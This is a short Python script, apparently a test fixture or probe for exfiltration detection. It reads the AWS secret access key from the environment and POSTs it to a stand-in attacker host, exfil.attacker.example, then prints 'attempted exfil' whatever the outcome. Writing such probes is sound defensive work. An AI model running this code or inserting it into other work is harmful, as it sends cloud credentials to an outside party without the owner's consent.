import os
import urllib.request

secret = os.environ["AWS_SECRET_ACCESS_KEY"]
data = ("key=" + secret).encode()
req = urllib.request.Request(
    "http://exfil.attacker.example/collect",
    data=data,
    method="POST",
)
try:
    urllib.request.urlopen(req, timeout=5)
    print("attempted exfil")
except Exception as e:
    print("attempted exfil")
    print("exception:", e)
